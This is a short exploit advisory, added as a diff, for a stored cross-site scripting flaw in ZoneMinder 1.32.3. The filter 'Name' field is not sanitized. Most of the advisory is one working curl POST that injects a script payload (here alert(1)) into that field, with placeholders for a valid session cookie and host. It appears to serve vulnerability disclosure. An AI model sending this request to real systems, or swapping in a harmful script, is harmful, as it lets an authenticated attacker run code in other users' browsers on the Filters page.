@@ -1,0 +1,15 @@
+# Exploit Title: ZoneMinder 1.32.3 - Stored Cross Site Scripting (filters)
+# Google Dork: None
+# Date: 6/29/2019
+# Exploit Author: Joey Lane
+# Vendor Homepage: https://zoneminder.com
+# Software Link: https://github.com/ZoneMinder/zoneminder/releases
+# Version: 1.32.3
+# Tested on: Ubuntu 16.04
+# CVE : Pending
+
+ZoneMinder 1.32.3 contains a stored cross site scripting vulnerability in the 'Filters' page.  The 'Name' field used to create a new filter is not being properly sanitized.  This allows an authenticated user to inject arbitrary javascript code, which will later be executed once a user returns to the Filters page.
+
+The following curl command injects an alert(1) payload into the vulnerable field.  The javascript is executed once a user visits the 'Filters' page.
+
+curl -X POST -H "Content-type: application/x-www-form-urlencoded" -d "Id=&action=Save&object=filter&filter%5BName%5D=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&filter%5BQuery%5D%5Bterms%5D%5B0%5D%5Battr%5D=MonitorId&filter%5BQuery%5D%5Bterms%5D%5B0%5D%5Bop%5D=%3D&filter%5BQuery%5D%5Bterms%5D%5B0%5D%5Bval%5D=1&filter%5BQuery%5D%5Bsort_field%5D=Id&filter%5BQuery%5D%5Bsort_asc%5D=1&filter%5BQuery%5D%5Blimit%5D=100&filter%5BAutoExecuteCmd%5D=0&filter%5BAutoMoveTo%5D=&Save=Save" --cookie "zmSkin=classic; zmCSS=classic; ZMSESSID=(A VALID SESSION ID)" http://(A VALID HOST)/zm/index.php?view=filter&sort_field=StartTime&sort_asc=1
